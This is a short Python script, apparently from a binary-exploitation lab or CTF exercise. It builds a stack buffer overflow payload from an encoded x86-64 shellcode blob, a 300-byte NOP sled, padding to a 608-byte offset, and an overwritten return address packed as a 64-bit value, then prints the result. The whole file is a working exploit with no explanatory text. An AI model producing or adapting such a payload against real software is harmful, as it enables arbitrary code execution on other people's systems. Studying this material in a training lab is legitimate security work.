from struct import pack



buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x4c\x9b\x0e\x15\xb8\x27\xce"
buf += b"\x14\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x26\xb2\x56\x8c\xd2\x25\x91\x7e\x4d\xc5\x01\x10\xf0"
buf += b"\xb0\x86\xad\x4e\x9b\x1f\x49\xb2\x21\x8f\x3f\x1d\xd3"
buf += b"\x87\xf3\xd2\x37\x94\x7e\x66\xc3\x01\x10\xd2\x24\x90"
buf += b"\x5c\xb3\x55\x64\x34\xe0\x28\xcb\x61\xba\xf1\x35\x4d"
buf += b"\x21\x6f\x75\x3b\x2e\xf2\x60\x3a\xcb\x4f\xce\x47\x04"
buf += b"\x12\xe9\x47\xef\x6f\x47\xf2\x43\x9e\x0e\x15\xb8\x27"
buf += b"\xce\x14"


nop = '\x90'


calculated_offset = 608

rip = 0x7fffffffe2fc
payload_len = calculated_offset + 8
nop_payload = 300* nop
shell_len = len(buf) 
nop_len = len (nop_payload)
padding = 'A'* (payload_len - shell_len - nop_len)
payload = nop_payload + buf + padding + pack("<Q", rip)

print(payload)